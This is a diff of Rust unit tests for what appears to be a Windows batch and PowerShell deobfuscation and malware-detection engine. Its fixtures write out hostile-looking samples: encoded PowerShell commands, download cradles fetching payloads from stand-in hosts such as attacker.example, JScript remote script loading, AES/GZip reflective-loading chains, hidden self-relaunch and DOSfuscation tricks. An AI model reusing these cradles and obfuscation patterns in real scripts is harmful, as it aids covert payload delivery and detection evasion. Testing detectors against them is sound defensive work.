@@ -84,7 +84,7 @@ mod tests {
         assert!(
             report
                 .deobfuscated
-                .contains("harrington: omitted 80 binary-looking lines"),
+                .contains("rem omitted 80 binary-looking lines"),
             "binary-looking tail should be summarized, got:\n{}",
             report.deobfuscated
         );
@@ -106,6 +106,247 @@ mod tests {
     }
 
     #[test]
+    fn powershell_encoded_command_is_rendered_decoded_in_deobfuscated_output() {
+        use base64::Engine as _;
+
+        let decoded = "Invoke-WebRequest -Uri http://encoded-render.example/news.php";
+        let utf16: Vec<u8> = decoded.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let encoded = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script = format!("powershell -noP -sta -w 1 -enc {encoded}\r\n");
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.deobfuscated.contains(decoded),
+            "decoded command was not rendered:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&encoded),
+            "encoded command blob leaked into deobfuscated output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn extracted_powershell_no_paren_utf16_b64_concat_urls_are_scanned() {
+        use base64::Engine as _;
+
+        let decoded = r#"
+$Bytes = 'htt';
+$Bytes2 = 'ps://';
+$base = $Bytes +$Bytes2;
+$links = @(($base + 'bitbucket.example/downloads/test.jpg'), ($base + 'office.example/test.jpg'));
+"#;
+        let utf16: Vec<u8> = decoded.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let encoded = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script = format!(
+            "powershell -NoProfile -Command \"$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String'{encoded}')\"\r\n"
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        for expected in [
+            "https://bitbucket.example/downloads/test.jpg",
+            "https://office.example/test.jpg",
+        ] {
+            assert!(
+                report.traits.iter().any(|trait_| matches!(
+                    trait_,
+                    Trait::DownloadInDeobText { src, .. } if src == expected
+                )),
+                "decoded concat URL {expected} missed: {:?}\nnormalized={:?}",
+                report.traits,
+                report.extracted_ps1_normalized
+            );
+        }
+    }
+
+    #[test]
+    fn rem_commented_script_tag_is_not_extracted_as_jscript() {
+        let script = b"@echo off\r\nREM <script>fetch(\"https://rem-comment-js.example/p\")</script>\r\necho done\r\n";
+
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            report.extracted_jscript.is_empty(),
+            "REM-commented script tag should not be extracted: {:?}",
+            report.extracted_jscript
+        );
+        assert!(
+            !report.traits.iter().any(|trait_| {
+                matches!(
+                    trait_,
+                    Trait::Download { src, .. } if src == "https://rem-comment-js.example/p"
+                )
+            }),
+            "REM-commented script tag produced a false download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn rem_commented_powershell_command_is_not_extracted_as_download() {
+        let script = br#"@echo off
+rem powershell -Command "(New-Object Net.WebClient).DownloadFile('https://rem-comment-ps.example/p.exe','%temp%\p.exe')"
+echo done
+"#;
+
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            report.extracted_ps1.is_empty() && report.extracted_ps1_normalized.is_empty(),
+            "REM-commented PowerShell should not be extracted: {:?} {:?}",
+            report.extracted_ps1,
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            !report.traits.iter().any(|trait_| {
+                matches!(
+                    trait_,
+                    Trait::Download { src, .. } if src == "https://rem-comment-ps.example/p.exe"
+                )
+            }),
+            "REM-commented PowerShell produced a false download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn long_cmd_echo_powershell_pipeline_is_extracted_and_summarized() {
+        let body = format!(
+            "function Stage($x) {{ {}; Invoke-WebRequest -Uri https://echo-pipe.example/payload.exe; }}",
+            "$x += 'pad'; ".repeat(260)
+        );
+        let script =
+            format!("doskey clear=cls & cmd.exe /c echo {body} | powershell.exe -NoProfile | more > nul\r\n");
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("echo-pipe.example/payload.exe")),
+            "echo-piped PowerShell body should be extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted long cmd-echo PowerShell pipeline line"),
+            "long raw pipeline should be summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("$x += 'pad'; $x += 'pad';"),
+            "raw PowerShell body should not pollute the main deob buffer:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn long_double_colon_payload_line_is_summarized_before_drive() {
+        let payload = "A".repeat(4096);
+        let script = format!("@echo off\r\n::/{payload}\r\necho keep\r\n");
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 4097 bytes from long :: payload line"),
+            "long :: payload line was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&payload),
+            "raw :: payload leaked into deob output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn huge_double_colon_payload_uses_sampled_carrier_classifier() {
+        let payload = format!(" {}\\{}", "A".repeat(384 * 1024), "B".repeat(4096));
+
+        assert!(crate::looks_like_huge_double_colon_payload_sample(&payload));
+        assert!(!crate::looks_like_huge_double_colon_payload_sample(
+            " powershell -nop -w hidden"
+        ));
+    }
+
+    #[test]
+    fn huge_self_read_aes_loader_skips_raw_aes_chain_after_ps1_extraction() {
+        let deob = "$x=[System.Security.Cryptography.Aes]::Create(); \
+                    [IO.File]::ReadAllText($p); \
+                    New-Object IO.Compression.GZipStream; \
+                    [System.Reflection.Assembly]::Load([byte[]]$buf)";
+
+        let large_raw = vec![b'A'; 8 * 1024 * 1024 + 1];
+        assert!(crate::skip_large_raw_self_read_aes_chain(&large_raw, deob));
+        assert!(!crate::skip_large_raw_self_read_aes_chain(b"small", deob));
+    }
+
+    #[test]
+    fn huge_self_read_aes_loader_with_colon_payload_does_not_skip_raw_aes_chain() {
+        let deob = "$x=[System.Security.Cryptography.Aes]::Create(); \
+                    [IO.File]::ReadAllText($p); \
+                    New-Object IO.Compression.GZipStream; \
+                    [System.Reflection.Assembly]::Load([byte[]]$buf)";
+
+        let mut large_raw = b"@echo off\r\n:: ciphertext-envelope\r\n".to_vec();
+        large_raw.resize(8 * 1024 * 1024 + 1, b'A');
+
+        assert!(
+            !crate::skip_large_raw_self_read_aes_chain(&large_raw, deob),
+            "raw AES chain should run when the self-read payload envelope is present"
+        );
+    }
+
+    #[test]
+    fn huge_self_read_aes_loader_detects_reversed_powershell_member_names() {
+        let deob = "$x=[System.Security.Cryptography.Aes]::Create(); \
+                    [IO.File]::('txeTllAdaeR'[-1..-11] -join '')($p); \
+                    New-Object IO.Compression.GZipStream; \
+                    [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$buf); \
+                    [Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($blob)";
+
+        let large_raw = vec![b'A'; 8 * 1024 * 1024 + 1];
+        assert!(crate::skip_large_raw_self_read_aes_chain(&large_raw, deob));
+    }
+
+    #[test]
+    fn aes_chain_guard_ignores_raw_only_hint_without_deob_material() {
+        let env = crate::env::Environment::new(&Config::default());
+        let raw = "cmd /c echo TransformFinalBlock hidden in a summarized carrier";
+        let deob = "rem omitted long cmd-echo PowerShell pipeline line";
+
+        assert!(!crate::should_run_aes_chain(raw, deob, &env));
+        assert!(crate::should_run_aes_chain(
+            "",
+            "System.Security.Cryptography.Aes; TransformFinalBlock",
+            &env
+        ));
+    }
+
+    #[test]
+    fn aes_chain_guard_accepts_echo_redirect_aes_material() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::EchoRedirect {
+            content: b"$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=[System.Convert]::FromBase64String('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=');$aes.IV=[System.Convert]::FromBase64String('AAAAAAAAAAAAAAAAAAAAAA==');$plain=$aes.CreateDecryptor().TransformFinalBlock($blob,0,$blob.Length);".to_vec(),
+            target: "nul".to_string(),
+            append: false,
+        });
+
+        assert!(crate::should_run_aes_chain(
+            "",
+            "rem omitted PS FromBase64String command line",
+            &env
+        ));
+    }
+
+    #[test]
     fn inert_nul_padding_line_is_summarized_without_command_truncation() {
         let mut env = crate::env::Environment::new(&Config::default());
         let mut out = String::new();
@@ -121,7 +362,7 @@ mod tests {
             "real command line should not be summarized"
         );
         assert!(
-            out.contains("harrington: omitted 70000 NUL padding bytes"),
+            out.contains("rem omitted 70000 NUL padding bytes"),
             "NUL padding summary missing from output: {:?}",
             out
         );
@@ -131,6 +372,149 @@ mod tests {
             ),
             "expected LineTruncated only for NUL padding line: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn raw_scan_text_omits_only_trailing_nul_padding() {
+        let mut text = "powershell -Command \"Write-Output keep\"\r\n".to_string();
+        text.push_str(&"\0".repeat(4096));
+        assert_eq!(
+            crate::trim_inert_nul_padding_suffix_text(&text),
+            "powershell -Command \"Write-Output keep\"\r\n"
+        );
+
+        let embedded = "echo a\0b";
+        assert_eq!(
+            crate::trim_inert_nul_padding_suffix_text(embedded),
+            embedded
+        );
+
+        let mut bytes = b"::payload\r\n".to_vec();
+        bytes.extend(std::iter::repeat_n(0, 4096));
+        let (prefix, padding_len) =
+            crate::split_inert_nul_padding_suffix_bytes(&bytes).expect("NUL padding suffix");
+        assert_eq!(prefix, b"::payload\r\n");
+        assert_eq!(padding_len, 4096);
+    }
+
+    #[test]
+    fn large_ascii_prefix_rules_out_utf16le_full_scan() {
+        let ascii = vec![b'A'; 128 * 1024];
+        let utf16: Vec<u8> = "powershell -Command Write-Host ok"
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .collect();
+
+        assert!(crate::large_input_prefix_rules_out_utf16le(&ascii));
+        assert!(!crate::large_input_prefix_rules_out_utf16le(&utf16));
+    }
+
+    #[test]
+    fn fast_ascii_case_insensitive_byte_search_matches_middle_and_absent() {
+        let haystack = b"prefix PowerShell -NoProfile suffix";
+
+        assert!(crate::contains_ascii_case_insensitive_bytes_fast(
+            haystack,
+            b"powershell"
+        ));
+        assert!(crate::contains_ascii_case_insensitive_bytes_fast(
+            haystack,
+            b"NOPROFILE"
+        ));
+        assert!(!crate::contains_ascii_case_insensitive_bytes_fast(
+            haystack, b"wscript"
+        ));
+        assert!(!crate::contains_ascii_case_insensitive_bytes_fast(
+            haystack, b""
+        ));
+    }
+
+    #[test]
+    fn omission_only_deob_text_without_urls_skips_final_deob_scan() {
+        assert!(crate::should_skip_final_deob_text_scan(
+            "rem omitted long inline PowerShell command line (4532 bytes)\r\n"
+        ));
+        assert!(!crate::should_skip_final_deob_text_scan(
+            "rem omitted long inline PowerShell command line (4532 bytes; urls: https://example.test/a)\r\n"
+        ));
+        assert!(!crate::should_skip_final_deob_text_scan(
+            "echo https://example.test/a\r\n"
+        ));
+    }
+
+    #[test]
+    fn long_inline_powershell_summary_includes_stride_decoded_urls() {
+        fn stride_carrier(decoded: &str, start: usize, step: usize) -> String {
+            let len = start + decoded.chars().count() * step;
+            let mut chars = vec!['x'; len];
+            for (idx, c) in decoded.chars().enumerate() {
+                chars[start + idx * step] = c;
+            }
+            chars.into_iter().collect()
+        }
+
+        let url = "https://stride-summary.example/payload.aaf";
+        let decoded = format!("Invoke-WebRequest {url} -OutFile stage.bin");
+        let carrier = stride_carrier(&decoded, 2, 3);
+        let body = format!(
+            "Function Amphiptere($Baylor19){{For($Masselgem=2;$Masselgem -lt $Baylor19.Length;$Masselgem+=3){{$out+=$Baylor19.'su'.'Invoke'($Masselgem,1);}}$out}};$x=Amphiptere '{carrier}';$pad='{}'",
+            "A".repeat(2300)
+        );
+        assert!(
+            crate::ps1_scan::normalize_ps1_text(&body).contains(url),
+            "test fixture should be decoded by the PowerShell normalizer"
+        );
+        let script = format!("start /min powershell.exe -Command \"{body}\"\r\n");
+        let line = script.trim_end();
+        let candidates = crate::long_inline_powershell_normalization_candidates(line);
+        assert!(
+            candidates.iter().any(|candidate| candidate == &body),
+            "PowerShell body should be a normalization candidate"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&body);
+        assert!(
+            crate::long_inline_powershell_summary_urls(&normalized)
+                .iter()
+                .any(|candidate| candidate == url),
+            "normalized fixture should expose URL to summary extraction:\n{}",
+            normalized
+        );
+        assert!(
+            crate::long_inline_powershell_summary_details(line)
+                .iter()
+                .any(|detail| detail.contains(url)),
+            "long inline summary details should include decoded URL"
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        let summarized = crate::summarize_long_inline_powershell_command_lines(&script, &mut env);
+        assert!(
+            summarized.contains(&format!("urls: {url}")),
+            "direct long inline summary should include decoded URL:\n{}",
+            summarized
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        let standalone = crate::summarize_standalone_inline_powershell_command(&script, &mut env)
+            .expect("standalone inline PowerShell fast path should summarize");
+        assert!(
+            standalone.contains(&format!("urls: {url}")),
+            "standalone inline summary should include decoded URL:\n{}",
+            standalone
+        );
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted long inline PowerShell command line"),
+            "long inline PowerShell should be summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(&format!("urls: {url}")),
+            "summary should include normalized stride-decoded URL hints:\n{}",
+            report.deobfuscated
         );
     }
 
@@ -164,6 +548,41 @@ mod tests {
     }
 
     #[test]
+    fn generated_windows_profile_blocks_are_elided_before_polyglot_prescan() {
+        let url = "https://profile-block.example/diagnostic.js";
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..64 {
+            script.push_str(&format!(":_WP_{idx:04}_DefenderCheck\r\n"));
+            script.push_str(&format!(
+                "echo <script language=\"JScript\">var marker='{url}{}';</script>\r\n",
+                "x".repeat(600)
+            ));
+            script.push_str("exit /b 0\r\n");
+        }
+        script.push_str(":after\r\necho after\r\n");
+
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.extracted_jscript.is_empty(),
+            "generated profile blocks must be elided before polyglot extraction: {:?}",
+            report.extracted_jscript
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 64 repeated Windows profile check blocks"),
+            "generated profile blocks were not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(":after\r\necho after"),
+            "following commands were not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn expanded_long_alpha_echo_noise_is_summarized_and_tail_url_rescued() {
         let url = "https://expanded-echo-tail.attacker.example/payload.bat";
         let payload = format!("{} {url}", "a".repeat(4096));
@@ -176,7 +595,7 @@ mod tests {
 
         assert!(
             report.deobfuscated.contains(&format!(
-                "harrington: omitted {} bytes from long alpha echo line",
+                "rem omitted {} bytes from long alpha echo line",
                 payload.len()
             )),
             "expanded alpha echo should be summarized, got:\n{}",
@@ -186,7 +605,7 @@ mod tests {
             report
                 .deobfuscated
                 .lines()
-                .any(|line| line.starts_with("::==== harrington: omitted") && line.len() < 128),
+                .any(|line| line.starts_with("rem omitted") && line.len() < 128),
             "summarized alpha echo output should stay compact, got:\n{}",
             report.deobfuscated
         );
@@ -214,7 +633,7 @@ mod tests {
         assert!(
             report
                 .deobfuscated
-                .contains("harrington: omitted 2560 bytes from hash-prefixed carrier line"),
+                .contains("rem omitted 2560 bytes from hash-prefixed carrier line"),
             "hash-prefixed carrier summary missing from fast path:\n{}",
             report.deobfuscated
         );
@@ -229,10 +648,129 @@ mod tests {
             report.traits
         );
     }
+
+    #[test]
+    fn simple_percent_substitute_fast_path_expands_dosfuscation_set_line() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("KCUR", "MARKset ");
+        env.set("EQ", "=");
+        env.set("ProgramData", r"C:\ProgramData");
+
+        let expanded = crate::fast_expand_simple_percent_line(
+            r#"%KCUR:MARK=%"NAME%EQ%v%ProgramData:~-4,4%""#,
+            &env,
+        )
+        .expect("DOSfuscation line should use simple fast expansion");
+
+        assert_eq!(expanded, r#"set "NAME=vData""#);
+    }
+
+    #[test]
+    fn simple_percent_substitute_fast_path_defers_when_batch_args_remain() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("KCUR", "MARKpowershell ");
+
+        assert!(
+            crate::fast_expand_simple_percent_line(r#"%KCUR:MARK=%-c "gc '%~f0'; echo %*""#, &env)
+                .is_none(),
+            "normalizer must handle special batch arg references left after expansion"
+        );
+    }
+
+    #[test]
+    fn simple_percent_substitute_fast_path_handles_long_marker_noise_line() {
+        let env = crate::env::Environment::new(&Config::default());
+        let marker = "ABCDEFGHIJKLMNOPQRSTUVWX";
+        let mut line = String::new();
+        for _ in 0..512 {
+            line.push('%');
+            line.push_str(marker);
+            line.push('%');
+            line.push('A');
+        }
+
+        let expanded = crate::fast_expand_simple_percent_line(&line, &env)
+            .expect("long repeated undefined marker line should expand in fast path");
+
+        assert_eq!(expanded, "A".repeat(512));
+    }
+
+    #[test]
+    fn percent_noise_echo_prefers_literals_over_known_env_path_injection() {
+        let env = crate::env::Environment::new(&Config::default());
+        let line = concat!(
+            "e%AlphaNoise%c%BravoNoise%h%CharlieNoise%o%DeltaNoise% ",
+            "Searching%NoiseOne% for%NoiseTwo% PDF%NoiseThree% files ",
+            "in t%cd%he Downloads folder%NoiseFour% with readable text"
+        );
+
+        let materialized = crate::materialized_percent_noise_action_line(line, &env)
+            .expect("percent-noise echo line should materialize");
+
+        assert_eq!(
+            materialized,
+            "echo Searching for PDF files in the Downloads folder with readable text"
+        );
+        assert!(
+            !materialized.contains(r"C:\Users\puncher\Downloads"),
+            "known %cd% value leaked into percent-noise echo: {materialized}"
+        );
+    }
+
+    #[test]
+    fn simple_percent_noise_echo_prefers_literals_over_known_env_path_injection() {
+        let env = crate::env::Environment::new(&Config::default());
+        let line = concat!(
+            "e%AlphaNoise%c%BravoNoise%h%CharlieNoise%o%DeltaNoise% ",
+            "Searching%NoiseOne% for%NoiseTwo% PDF%NoiseThree% files ",
+            "in t%cd%he Downloads folder%NoiseFour% with readable text"
+        );
+
+        let expanded = crate::fast_expand_simple_percent_line(line, &env)
+            .expect("simple percent-noise echo line should expand");
+
+        assert_eq!(
+            expanded,
+            "echo Searching for PDF files in the Downloads folder with readable text"
+        );
+        assert!(
+            !expanded.contains(r"C:\Users\puncher\Downloads"),
+            "known %cd% value leaked into simple percent-noise echo: {expanded}"
+        );
+    }
+
+    #[test]
+    fn delayed_set_alias_fast_path_expands_staged_assignment_line() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.delayed_expansion = true;
+        env.set("setter", "set");
+
+        let expanded = crate::fast_expand_delayed_set_alias_line(
+            r#"!setter! "payload=fragment with spaces""#,
+            &env,
+        )
+        .expect("delayed set alias should expand directly");
+
+        assert_eq!(expanded, r#"set "payload=fragment with spaces""#);
+    }
+
+    #[test]
+    fn delayed_set_alias_fast_path_defers_noisy_percent_assignment() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.delayed_expansion = true;
+        env.set("setter", "set");
+
+        assert!(
+            crate::fast_expand_delayed_set_alias_line(r#"!setter! "payload=a%NOISE%b""#, &env,)
+                .is_none(),
+            "percent-bearing assignment values still need normal expansion"
+        );
+    }
 }
 
 #[cfg(test)]
 mod env_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
 
     #[test]
@@ -249,7 +787,7 @@ mod env_tests {
 
     #[test]
     fn env_set_and_get_case_insensitive() {
-        let mut env = Environment::new(&Config::default());
+        let mut env = crate::env::Environment::new(&Config::default());
         env.set("Foo", "Bar");
         assert_eq!(env.get("foo").as_deref(), Some("Bar"));
         assert_eq!(env.get("FOO").as_deref(), Some("Bar"));
@@ -257,10 +795,105 @@ mod env_tests {
 
     #[test]
     fn env_set_empty_value_deletes() {
-        let mut env = Environment::new(&Config::default());
+        let mut env = crate::env::Environment::new(&Config::default());
         env.set("XYZ", "v");
         env.set("XYZ", "");
         assert!(env.get("XYZ").is_none());
+    }
+
+    #[test]
+    fn path_extension_uses_prior_path_value_without_recursive_reexpansion() {
+        let script = format!(
+            "set \"BASEDIR=C:\\Cache\"\nset PATH=%BASEDIR%;%BASEDIR%\\Scripts;%PATH%\necho %PATH%\nrem {}\n",
+            "x".repeat(1024)
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains(r"C:\Cache;C:\Cache\Scripts;C:\WINDOWS\system32"),
+            "PATH extension did not retain its prior baseline value:\n{}",
+            report.deobfuscated
+        );
+        assert_eq!(
+            report.deobfuscated.matches(r"C:\Cache\Scripts").count(),
+            1,
+            "PATH assignment or its echo was recursively expanded:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|trait_| matches!(
+                trait_,
+                crate::Trait::ReExpansionDepthCapped { variable, .. }
+                    if variable.eq_ignore_ascii_case("PATH")
+            )),
+            "ordinary PATH extension should not hit re-expansion cap: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn self_relaunched_path_extension_does_not_reexpand_itself() {
+        let script = br#"@echo off
+if "%~1"=="hidden" goto main
+powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
+exit
+:main
+set "BASEDIR=C:\Cache"
+set PATH=%BASEDIR%;%BASEDIR%\Scripts;%PATH%
+echo %PATH%
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert_eq!(
+            report.deobfuscated.matches(r"C:\Cache\Scripts").count(),
+            1,
+            "self-relaunch path extension was recursively expanded:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|trait_| matches!(
+                trait_,
+                crate::Trait::ReExpansionDepthCapped { variable, .. }
+                    if variable.eq_ignore_ascii_case("PATH")
+            )),
+            "self-relaunch path extension should not hit re-expansion cap: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn conditional_before_path_extension_does_not_reexpand_itself() {
+        let script = br#"set "BASEDIR=C:\Cache"
+for %%F in ("%BASEDIR%\python*._pth") do set PTHFILE=%%F
+if exist "%PTHFILE%" (
+    echo ready
+) else (
+    echo missing
+)
+set PATH=%BASEDIR%;%BASEDIR%\Scripts;%PATH%
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert_eq!(
+            report.deobfuscated.matches(r"C:\Cache\Scripts").count(),
+            1,
+            "conditional path extension was recursively expanded:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|trait_| matches!(
+                trait_,
+                crate::Trait::ReExpansionDepthCapped { variable, .. }
+                    if variable.eq_ignore_ascii_case("PATH")
+            )),
+            "conditional path extension should not hit re-expansion cap: {:?}",
+            report.traits
+        );
     }
 }
 
@@ -629,6 +1262,14 @@ mod split_tests {
     fn redirect_amp_kept() {
         assert_eq!(split_commands("foo 2>&1"), vec!["foo 2>&1"]);
     }
+
+    #[test]
+    fn unquoted_set_assignment_preserves_trailing_space_value() {
+        assert_eq!(
+            split_commands("set SP= & echo %SP%x"),
+            vec!["set SP= ", "echo %SP%x"]
+        );
+    }
 }
 
 #[cfg(test)]
@@ -698,6 +1339,28 @@ mod set_tests {
         let mut env = Environment::new(&Config::default());
         interpret_line("set EXP=43 ", &mut env);
         assert_eq!(env.get("exp").as_deref(), Some("43 "));
+    }
+
+    #[test]
+    fn deobfuscated_output_uses_trailing_space_set_fragments() {
+        let report = analyze(
+            br#"set SP= 
+set A=curl
+set B=-s
+%A%%SP%%B%"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.deobfuscated.contains("curl -s"),
+            "space-valued SET fragment was lost:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("curl-s"),
+            "command fragments were incorrectly compacted:\n{}",
+            report.deobfuscated
+        );
     }
 
     #[test]
@@ -832,6 +1495,68 @@ powershell -NoProfile -File .\stage.ps1"#,
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn top_level_set_p_prompt_redirect_writes_without_newline(
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        let mut env = Environment::new(&Config::default());
+
+        interpret_line(
+            r#"<nul set /p OUT="Invoke-WebRequest -Uri h" > stage.ps1"#,
+            &mut env,
+        );
+        interpret_line(
+            r#"<nul set /p OUT="ttps://set-p-top-level.example/stage.ps1" >> stage.ps1"#,
+            &mut env,
+        );
+
+        let Some(crate::env::FsEntry::Content { content, .. }) =
+            env.modified_filesystem.get("stage.ps1")
+        else {
+            return Err(format!(
+                "stage.ps1 was not materialized: {:?}",
+                env.modified_filesystem
+            )
+            .into());
+        };
+        assert_eq!(
+            String::from_utf8_lossy(content),
+            "Invoke-WebRequest -Uri https://set-p-top-level.example/stage.ps1"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn top_level_set_p_prompt_redirected_js_is_scanned_when_run_by_cmd() {
+        let report = analyze(
+            br#"set/p OUT="try{var c='script:';d='hTtP:';GetObject(c+d+'//set-p-js.example/?1/');}catch(e){};"<nul > C:\Windows\Temp\iDV.Js|%ComSpec% /c C:\Windows\Temp\iDV.Js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "http://set-p-js.example/?1/"
+                )
+            }),
+            "set /p redirected JS was not scanned: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::EchoRedirect { content, .. }
+                        if String::from_utf8_lossy(content)
+                            == "try{var c='script:';d='hTtP:';GetObject(c+d+'//set-p-js.example/?1/');}catch(e){};"
+                )
+            }),
+            "set /p redirected content was polluted by stdin or pipeline tail: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -866,6 +1591,126 @@ mod analyze_tests {
             )
         });
         assert!(has, "unicode-noise var chain missed: {:?}", report.traits);
+    }
+
+    #[test]
+    fn analyze_resolves_caret_percent_marker_laced_set_command() {
+        let script = concat!(
+            "@echo off\r\n",
+            "setlocal enabledelayedexpansion\r\n",
+            "%^%s%AlphaNoise%%^%e%BetaNoise%%^%t%GammaNoise% \"A=cscript /\"\r\n",
+            "%^%s%DeltaNoise%%^%e%EpsilonNoise%%^%t%ZetaNoise% \"B=/nologo\"\r\n",
+            "echo !A!!B! payload.vbs\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo cscript //nologo payload.vbs"),
+            "marker-laced set command did not feed delayed expansion:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("AlphaNoise"),
+            "raw marker-laced set carrier leaked:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn analyze_resolves_long_consecutive_caret_percent_marker_laced_set_commands() {
+        let script = format!(
+            concat!(
+                "setlocal enabledelayedexpansion\r\n",
+                "%^%s%{}%%^%e%{}%%^%t%{}% \"LOHfm=w\"\r\n",
+                "%^%s%{}%%^%e%{}%%^%t%{}% \"bLmGF=m\"\r\n",
+                "echo !LOHfm!-!bLmGF!\r\n"
+            ),
+            "A".repeat(180),
+            "B".repeat(180),
+            "C".repeat(180),
+            "D".repeat(180),
+            "E".repeat(180),
+            "F".repeat(180),
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("echo w-m"),
+            "long consecutive marker-laced set commands did not feed delayed expansion:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&"A".repeat(64))
+                && !report.deobfuscated.contains(&"D".repeat(64)),
+            "raw marker-laced set carrier leaked:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn analyze_resolves_long_caret_percent_marker_laced_echo_redirect() {
+        let script = format!(
+            concat!(
+                "setlocal enabledelayedexpansion\r\n",
+                "%^%s%{}%%^%e%{}%%^%t%{}% \"OUT=stage.log\"\r\n",
+                "%^%e%{}%%^%c%{}%%^%h%{}%%^%o%{}% hello>>\"!OUT!\"\r\n"
+            ),
+            "A".repeat(180),
+            "B".repeat(180),
+            "C".repeat(180),
+            "D".repeat(180),
+            "E".repeat(180),
+            "F".repeat(180),
+            "G".repeat(180),
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::EchoRedirect { target, content, append }
+                    if target == "stage.log" && content == b"hello\r\n" && *append
+            )),
+            "marker-laced echo redirect was not reconstructed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn analyze_resolves_indented_caret_percent_marker_laced_commands() {
+        let script = format!(
+            concat!(
+                "setlocal enabledelayedexpansion\r\n",
+                "   %^%s%{}%%^%e%{}%%^%t%{}% \"OUT=stage.log\"\r\n",
+                "\t%^%e%{}%%^%c%{}%%^%h%{}%%^%o%{}% hi>>\"!OUT!\"\r\n"
+            ),
+            "A".repeat(180),
+            "B".repeat(180),
+            "C".repeat(180),
+            "D".repeat(180),
+            "E".repeat(180),
+            "F".repeat(180),
+            "G".repeat(180),
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|trait_| matches!(
+                trait_,
+                Trait::EchoRedirect { target, content, append }
+                    if target == "stage.log" && content == b"hi\r\n" && *append
+            )),
+            "indented marker-laced commands were not reconstructed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
     }
 
     #[test]
